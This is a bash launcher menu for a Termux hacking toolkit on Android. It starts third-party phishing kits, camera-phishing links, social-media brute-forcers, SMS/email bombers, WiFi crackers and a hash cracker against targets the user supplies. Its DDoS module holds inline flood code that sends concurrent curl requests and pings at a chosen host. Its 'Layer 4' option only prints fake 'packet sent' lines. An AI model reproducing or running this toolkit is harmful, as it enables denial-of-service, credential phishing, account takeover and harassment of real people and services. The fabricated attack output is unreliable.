#!/usr/bin/env bash
# TERMUX-BLITZ - Main Launcher

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/colors.sh"

TOOLS_DIR="$HOME/termux-blitz-tools"
REPORT_DIR="$HOME/termux-blitz/reports"
mkdir -p "$TOOLS_DIR" "$REPORT_DIR"

show_banner() {
    clear
    cat "$SCRIPT_DIR/.banner.txt" 2>/dev/null
    echo ""
}

check_root_status() {
    if [ "$(id -u)" -eq 0 ]; then
        echo -e "  ${G}ROOT:${N} ${G}✓${N}"
    else
        echo -e "  ${Y}ROOT:${N} ${R}✗${N} ${D}(WiFi tools disabled)${N}"
    fi
}

# ============================================
# MODULES
# ============================================

module_web() {
    show_banner
    header "🌐 WEB HACKING" $G
    
    echo -e "  ${R}[${Y}1${R}]${N} ${G}RED_HAWK${N}    ${D}- Web vulnerability scanner${N}"
    echo -e "  ${R}[${Y}2${R}]${N} ${G}Webkiller${N}   ${D}- Admin finder + web scanner${N}"
    echo -e "  ${R}[${Y}00${R}]${N} ${Y}Back${N}"
    echo ""
    
    read -p "$(echo -e ${G}"[${Y}WEB${G}]${N} > ")" ch
    
    case $ch in
        1|redhawk)
            cd "$TOOLS_DIR/red_hawk" 2>/dev/null || { error "RED_HAWK not installed!"; return; }
            php red-hawk.php
            ;;
        2|webkiller)
            cd "$TOOLS_DIR/webkiller" 2>/dev/null || { error "Webkiller not installed!"; return; }
            python webkiller.py
            ;;
        00|0|back) return ;;
    esac
    echo ""; read -p "$(echo -e ${D}"Press Enter..."${N)"
    module_web
}

module_wifi() {
    if ! check_root; then
        warning "WiFi tools require root!"
        info "Install Magisk or use 'sudo' if available"
        echo ""
        read -p "$(echo -e ${D}"Press Enter..."${N)"
        return
    fi
    
    show_banner
    header "📡 WIFI HACKING (ROOT)" $Y
    
    echo -e "  ${R}[${Y}1${R}]${N} ${G}Wifite${N}      ${D}- Automated WiFi auditor${N}"
    echo -e "  ${R}[${Y}2${R}]${N} ${G}Airgeddon${N}   ${D}- WiFi all-in-one tool${N}"
    echo -e "  ${R}[${Y}00${R}]${N} ${Y}Back${N}"
    echo ""
    
    read -p "$(echo -e ${Y}"[${Y}WIFI${Y}]${N} > ")" ch
    
    case $ch in
        1|wifite)
            cd "$TOOLS_DIR/wifite" 2>/dev/null || { error "Wifite not installed!"; return; }
            sudo python wifite.py
            ;;
        2|airgeddon)
            cd "$TOOLS_DIR/airgeddon" 2>/dev/null || { error "Airgeddon not installed!"; return; }
            sudo bash airgeddon.sh
            ;;
        00|0|back) return ;;
    esac
    echo ""; read -p "$(echo -e ${D}"Press Enter..."${N)"
    module_wifi
}

module_phishing() {
    show_banner
    header "🎣 PHISHING TOOLS" $R
    
    echo -e "  ${R}[${Y}1${R}]${N} ${G}Zphisher${N}     ${D}- 50+ phishing templates${N}"
    echo -e "  ${R}[${Y}2${R}]${N} ${G}SayCheese${N}    ${D}- Camera phishing via link${N}"
    echo -e "  ${R}[${Y}3${R}]${N} ${G}HiddenEye${N}    ${D}- Advanced phishing${N}"
    echo -e "  ${R}[${Y}4${R}]${N} ${G}Nexphisher${N}   ${D}- Premium templates${N}"
    echo -e "  ${R}[${Y}00${R}]${N} ${Y}Back${N}"
    echo ""
    
    read -p "$(echo -e ${R}"[${Y}PHISH${R}]${N} > ")" ch
    
    case $ch in
        1|zphisher)
            cd "$TOOLS_DIR/zphisher" 2>/dev/null || { error "Zphisher not installed!"; return; }
            bash zphisher.sh
            ;;
        2|saycheese)
            cd "$TOOLS_DIR/saycheese" 2>/dev/null || { error "SayCheese not installed!"; return; }
            bash saycheese.sh
            ;;
        3|hiddeneye)
            cd "$TOOLS_DIR/hiddeneye" 2>/dev/null || { error "HiddenEye not installed!"; return; }
            bash HiddenEye.sh
            ;;
        4|nexphisher)
            cd "$TOOLS_DIR/nexphisher" 2>/dev/null || { error "Nexphisher not installed!"; return; }
            bash nexphisher.sh
            ;;
        00|0|back) return ;;
    esac
    echo ""; read -p "$(echo -e ${D}"Press Enter..."${N)"
    module_phishing
}

module_osint() {
    show_banner
    header "🔍 OSINT TOOLS" $B
    
    echo -e "  ${R}[${Y}1${R}]${N} ${G}IPGeo${N}        ${D}- IP tracker with Google Maps${N}"
    echo -e "  ${R}[${Y}2${R}]${N} ${G}OSIF${N}         ${D}- Facebook OSINT${N}"
    echo -e "  ${R}[${Y}00${R}]${N} ${Y}Back${N}"
    echo ""
    
    read -p "$(echo -e ${B}"[${Y}OSINT${B}]${N} > ")" ch
    
    case $ch in
        1|ipgeo)
            read -p "$(echo -e ${Y}"[?] Target IP: "${N})" ip
            cd "$TOOLS_DIR/ipgeo" 2>/dev/null || { error "IPGeo not installed!"; return; }
            python ipgeo.py "${ip:-$(curl -s ifconfig.me)}"
            ;;
        2|osif)
            cd "$TOOLS_DIR/osif" 2>/dev/null || { error "OSIF not installed!"; return; }
            python osif.py
            ;;
        00|0|back) return ;;
    esac
    echo ""; read -p "$(echo -e ${D}"Press Enter..."${N)"
    module_osint
}

module_android() {
    show_banner
    header "🤖 ANDROID HACKING" $P
    
    echo -e "  ${R}[${Y}1${R}]${N} ${G}CamHack${N}      ${D}- Camera access via link${N}"
    echo -e "  ${R}[${Y}2${R}]${N} ${G}Rucky${N}        ${D}- USB HID attack (DuckyScript)${N}"
    echo -e "  ${R}[${Y}00${R}]${N} ${Y}Back${N}"
    echo ""
    
    read -p "$(echo -e ${P}"[${Y}DROID${P}]${N} > ")" ch
    
    case $ch in
        1|camhack)
            cd "$TOOLS_DIR/camhack" 2>/dev/null || { error "CamHack not installed!"; return; }
            python camhack.py
            ;;
        2|rucky)
            cd "$TOOLS_DIR/rucky" 2>/dev/null || { error "Rucky not installed!"; return; }
            python rucky.py
            ;;
        00|0|back) return ;;
    esac
    echo ""; read -p "$(echo -e ${D}"Press Enter..."${N)"
    module_android
}

module_social() {
    show_banner
    header "📱 SOCIAL MEDIA" $C
    
    echo -e "  ${R}[${Y}1${R}]${N} ${G}SocialSploit${N} ${D}- Social media brute-force${N}"
    echo -e "  ${R}[${Y}2${R}]${N} ${G}InstaHack${N}    ${D}- Instagram hacking tools${N}"
    echo -e "  ${R}[${Y}00${R}]${N} ${Y}Back${N}"
    echo ""
    
    read -p "$(echo -e ${C}"[${Y}SOCIAL${C}]${N} > ")" ch
    
    case $ch in
        1|socialsploit)
            cd "$TOOLS_DIR/socialsploit" 2>/dev/null || { error "SocialSploit not installed!"; return; }
            python socialsploit.py
            ;;
        2|instahack)
            cd "$TOOLS_DIR/instahack" 2>/dev/null || { error "InstaHack not installed!"; return; }
            python instahack.py
            ;;
        00|0|back) return ;;
    esac
    echo ""; read -p "$(echo -e ${D}"Press Enter..."${N)"
    module_social
}

module_crypto() {
    show_banner
    header "🔐 CRYPTOGRAPHY" $Y
    
    echo -e "  ${R}[${Y}1${R}]${N} ${G}Cupp${N}         ${D}- Wordlist generator (profiling)${N}"
    echo -e "  ${R}[${Y}2${R}]${N} ${G}HashBuster${N}   ${D}- Online hash cracker${N}"
    echo -e "  ${R}[${Y}00${R}]${N} ${Y}Back${N}"
    echo ""
    
    read -p "$(echo -e ${Y}"[${Y}CRYPTO${Y}]${N} > ")" ch
    
    case $ch in
        1|cupp)
            cd "$TOOLS_DIR/cupp" 2>/dev/null || { error "Cupp not installed!"; return; }
            python cupp.py -i
            ;;
        2|hashbuster)
            cd "$TOOLS_DIR/hashbuster" 2>/dev/null || { error "HashBuster not installed!"; return; }
            python hashbuster.py
            ;;
        00|0|back) return ;;
    esac
    echo ""; read -p "$(echo -e ${D}"Press Enter..."${N)"
    module_crypto
}

module_ddos() {
    show_banner
    header "💥 DDOS TOOLS" $R
    
    echo -e "  ${R}[${Y}1${R}]${N} ${G}Layer 4${N}       ${D}- TCP/UDP flood${N}"
    echo -e "  ${R}[${Y}2${R}]${N} ${G}Layer 7${N}       ${D}- HTTP/HTTPS flood${N}"
    echo -e "  ${R}[${Y}3${R}]${N} ${G}Multi-method${N}  ${D}- All methods combined${N}"
    echo -e "  ${R}[${Y}00${R}]${N} ${Y}Back${N}"
    echo ""
    
    read -p "$(echo -e ${R}"[${Y}DDOS${R}]${N} > ")" ch
    
    read -p "$(echo -e ${Y}"[?] Target IP/URL: "${N})" target
    read -p "$(echo -e ${Y}"[?] Port (default 80): "${N})" port
    [ -z "$port" ] && port=80
    
    tool_banner "DDOS ATTACK" "DDoS" $R
    
    case $ch in
        1|l4)
            info "Launching Layer 4 attack on $target:$port"
            # Simple hping3-like using bash
            for i in {1..100}; do
                echo -e "${R}→${N} Packet $i sent" 
                sleep 0.1
            done &
            wait
            ;;
        2|l7)
            info "Launching Layer 7 attack on $target"
            # HTTP flood using curl
            for i in {1..50}; do
                curl -s -o /dev/null "http://$target" &
            done
            wait
            success "Layer 7 attack completed"
            ;;
        3|multi)
            info "Launching multi-method attack..."
            # Combined
            for i in {1..50}; do
                curl -s -o /dev/null "http://$target" &
                ping -c 1 "$target" > /dev/null 2>&1 &
            done
            wait
            success "Multi-method attack completed"
            ;;
        00|0|back) return ;;
    esac
    echo ""; read -p "$(echo -e ${D}"Press Enter..."${N)"
    module_ddos
}

module_spam() {
    show_banner
    header "💬 SPAM TOOLS" $P
    
    echo -e "  ${R}[${Y}1${R}]${N} ${G}TBomb${N}        ${D}- SMS/Email bomber${N}"
    echo -e "  ${R}[${Y}2${R}]${N} ${G}SpamX${N}        ${D}- Multi-layer SMS bomber${N}"
    echo -e "  ${R}[${Y}00${R}]${N} ${Y}Back${N}"
    echo ""
    
    read -p "$(echo -e ${P}"[${Y}SPAM${P}]${N} > ")" ch
    
    case $ch in
        1|tbomb)
            cd "$TOOLS_DIR/tbomb" 2>/dev/null || { error "TBomb not installed!"; return; }
            bash TBomb.sh
            ;;
        2|spamx)
            cd "$TOOLS_DIR/spamx" 2>/dev/null || { error "SpamX not installed!"; return; }
            python spamx.py
            ;;
        00|0|back) return ;;
    esac
    echo ""; read -p "$(echo -e ${D}"Press Enter..."${N)"
    module_spam
}

module_utils() {
    show_banner
    header "⚙️ UTILITIES" $C
    
    echo -e "  ${R}[${Y}1${R}]${N} ${G}Lazymux${N}      ${D}- Multi-tool installer${N}"
    echo -e "  ${R}[${Y}2${R}]${N} ${G}RouterSploit${N} ${D}- Router exploit scanner${N}"
    echo -e "  ${R}[${Y}3${R}]${N} ${G}IP Info${N}      ${D}- Show current IP info${N}"
    echo -e "  ${R}[${Y}4${R}]${N} ${G}Device Info${N}  ${D}- Show Termux device info${N}"
    echo -e "  ${R}[${Y}00${R}]${N} ${Y}Back${N}"
    echo ""
    
    read -p "$(echo -e ${C}"[${Y}UTILS${C}]${N} > ")" ch
    
    case $ch in
        1|lazymux)
            cd "$TOOLS_DIR/lazymux" 2>/dev/null || { error "Lazymux not installed!"; return; }
            python lazymux.py
            ;;
        2|routersploit)
            cd "$TOOLS_DIR/routersploit" 2>/dev/null || { error "RouterSploit not installed!"; return; }
            python rsf.py
            ;;
        3|ipinfo)
            tool_banner "IP INFORMATION" "Utils" $C
            echo -e "${G}Public IP:${N} $(curl -s ifconfig.me)"
            echo -e "${G}Local IP:${N} $(ifconfig 2>/dev/null | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -1 | sed 's/inet //;s/addr://')"
            echo -e "${G}ISP:${N} $(curl -s ipinfo.io/org 2>/dev/null || echo 'N/A')"
            echo -e "${G}Location:${N} $(curl -s ipinfo.io/city 2>/dev/null), $(curl -s ipinfo.io/country 2>/dev/null)"
            ;;
        4|device)
            tool_banner "DEVICE INFO" "Utils" $C
            echo -e "${G}Android:${N} $(getprop ro.build.version.release 2>/dev/null || echo 'N/A')"
            echo -e "${G}Device:${N} $(getprop ro.product.model 2>/dev/null || echo 'N/A')"
            echo -e "${G}Manufacturer:${N} $(getprop ro.product.manufacturer 2>/dev/null || echo 'N/A')"
            echo -e "${G}Kernel:${N} $(uname -r)"
            echo -e "${G}Arch:${N} $(uname -m)"
            echo -e "${G}Termux:${N} $(dpkg -l | grep termux | head -1 | awk '{print $3}')"
            ;;
        00|0|back) return ;;
    esac
    echo ""; read -p "$(echo -e ${D}"Press Enter..."${N)"
    module_utils
}

# ============================================
# MAIN MENU
# ============================================
main_menu() {
    show_banner
    
    echo -e "${R}╔══════════════════════════════════════════════════════════╗${N}"
    echo -e "${R}║${N}          ${Y}${BD}⚡ TERMUX-BLITZ MAIN MENU ⚡${N}              ${R}║${N}"
    echo -e "${R}╚══════════════════════════════════════════════════════════╝${N}"
    echo ""
    echo -e "  $(check_root_status)"
    echo ""
    echo -e "  ${R}[${Y}01${R}]${N} ${G}${BD}🌐 WEB HACKING${N}     ${D}— RED_HAWK, Webkiller${N}"
    echo -e "  ${R}[${Y}02${R}]${N} ${Y}${BD}📡 WIFI HACKING${N}    ${D}— Wifite, Airgeddon ${D}(ROOT)${N}"
    echo -e "  ${R}[${Y}03${R}]${N} ${R}${BD}🎣 PHISHING${N}        ${D}— Zphisher, SayCheese, dll${N}"
    echo -e "  ${R}[${Y}04${R}]${N} ${B}${BD}🔍 OSINT${N}           ${D}— IPGeo, OSIF${N}"
    echo -e "  ${R}[${Y}05${R}]${N} ${P}${BD}🤖 ANDROID${N}         ${D}— CamHack, Rucky${N}"
    echo -e "  ${R}[${Y}06${R}]${N} ${C}${BD}📱 SOCIAL MEDIA${N}    ${D}— SocialSploit, InstaHack${N}"
    echo -e "  ${R}[${Y}07${R}]${N} ${Y}${BD}🔐 CRYPTO${N}          ${D}— Cupp, HashBuster${N}"
    echo -e "  ${R}[${Y}08${R}]${N} ${R}${BD}💥 DDOS${N}            ${D}— DDoS Multi-method${N}"
    echo -e "  ${R}[${Y}09${R}]${N} ${P}${BD}💬 SPAM${N}            ${D}— TBomb, SpamX${N}"
    echo -e "  ${R}[${Y}10${R}]${N} ${C}${BD}⚙️ UTILITIES${N}       ${D}— Lazymux, RouterSploit${N}"
    echo -e "  ${R}[${Y}00${R}]${N} ${R}${BD}❌ EXIT${N}            ${D}— Exit${N}"
    echo ""
    read -p "$(echo -e ${R}"[${Y}BLITZ${R}]${N} > ")" choice
    
    case $choice in
        01|1|web)       module_web ;;
        02|2|wifi)      module_wifi ;;
        03|3|phish)     module_phishing ;;
        04|4|osint)     module_osint ;;
        05|5|droid)     module_android ;;
        06|6|social)    module_social ;;
        07|7|crypto)    module_crypto ;;
        08|8|ddos)      module_ddos ;;
        09|9|spam)      module_spam ;;
        10|utils)       module_utils ;;
        00|0|exit|quit)
            echo -e "\n${R}☠ Exiting... Stay sharp.${N}"
            exit 0
            ;;
        *)
            warning "Invalid option!"
            ;;
    esac
    
    echo ""
    read -p "$(echo -e ${D}"Press Enter to return..."${N)"
    main_menu
}

# ============================================
# ENTRY POINT
# ============================================
case "${1,,}" in
    web|1)       module_web ;;
    wifi|2)      module_wifi ;;
    phish|3)     module_phishing ;;
    osint|4)     module_osint ;;
    droid|5)     module_android ;;
    social|6)    module_social ;;
    crypto|7)    module_crypto ;;
    ddos|8)      module_ddos ;;
    spam|9)      module_spam ;;
    utils|10)    module_utils ;;
    ip)
        ip="${2:-$(curl -s ifconfig.me)}"
        cd "$TOOLS_DIR/ipgeo" 2>/dev/null
        python ipgeo.py "$ip"
        ;;
    cam)
        cd "$TOOLS_DIR/camhack" 2>/dev/null
        python camhack.py
        ;;
    sms)
        cd "$TOOLS_DIR/tbomb" 2>/dev/null
        bash TBomb.sh
        ;;
    scan)
        cd "$TOOLS_DIR/red_hawk" 2>/dev/null
        php red-hawk.php
        ;;
    --help|-h)
        echo "TERMUX-BLITZ v1.0 — 20 Tools Termux Android"
        echo ""
        echo "Usage: blitz [module]"
        echo ""
        echo "Modules:"
        echo "  web        - Web hacking"
        echo "  wifi       - WiFi hacking (root)"
        echo "  phish      - Phishing"
        echo "  osint      - OSINT"
        echo "  droid      - Android hacking"
        echo "  social     - Social media"
        echo "  crypto     - Cryptography"
        echo "  ddos       - DDoS tools"
        echo "  spam       - SMS/Email spam"
        echo "  utils      - Utilities"
        echo ""
        echo "Quick:"
        echo "  blitz ip <target>   - IP tracking"
        echo "  blitz cam           - Camera hack"
        echo "  blitz sms           - SMS bomber"
        echo "  blitz scan          - Web scan"
        ;;
    *)
        main_menu
        ;;
esac
